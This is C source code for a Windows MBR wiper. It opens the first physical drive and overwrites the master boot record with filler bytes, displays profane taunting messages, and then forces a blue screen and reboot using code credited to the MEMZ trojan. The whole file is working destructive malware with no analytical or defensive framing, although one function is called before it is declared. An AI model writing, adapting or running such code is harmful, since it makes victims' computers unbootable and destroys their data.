#include <windows.h>
 
int main(void)
{
// blog.csdn.net/qq_19459853/article/details/50275619
	//drive
	LPCSTR DiskFileName="\\\\.\\PhysicalDrive0";
	//fake
	char code[]=
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	BYTE MBR[512];
	DWORD s=NULL,t=NULL;
	/* handle */
	HANDLE handle=NULL;
	//mbr
	memcpy(MBR,code,sizeof(code)-1);
	//disk
	handle=CreateFileA(
		DiskFileName,
		GENERIC_READ|GENERIC_WRITE,
		FILE_SHARE_READ|FILE_SHARE_WRITE,
		0,
		OPEN_EXISTING,
		0,
		0);
	if(handle==INVALID_HANDLE_VALUE)
	{
		//fail
		MessageBoxA(NULL,(LPCSTR)"Your fucking OS is great!",(LPCSTR)"FuckshitNoMBR",MB_OK|MB_ICONERROR);
		return 0;
	}else{
		//break
		WriteFile(handle,MBR,sizeof(MBR),&t,NULL);
		DeviceIoControl(handle,FSCTL_UNLOCK_VOLUME,NULL,0,NULL,0,&s,NULL);
		CloseHandle(handle);//close
		MessageBoxA(NULL,(LPCSTR)"Eat shit! Your MBR is breaked! You have 1 minute left! If you're not to cherish it then go BSoD!",(LPCSTR)"FuckshitNoMBR",MB_OK|MB_ICONINFORMATION);
  Sleep(60000);
  killWindowsInstant();
		return 0;
	}
	return 0;
}
void killWindowsInstant() {
	// force BSoD, from raw.githubusercontent.com/Leurak/MEMZ/master/WindowsTrojan/Source/Destructive/KillWindows.c
	HMODULE ntdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
		BOOLEAN tmp1; DWORD tmp2;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
	}
	HANDLE token;
	TOKEN_PRIVILEGES privileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
}
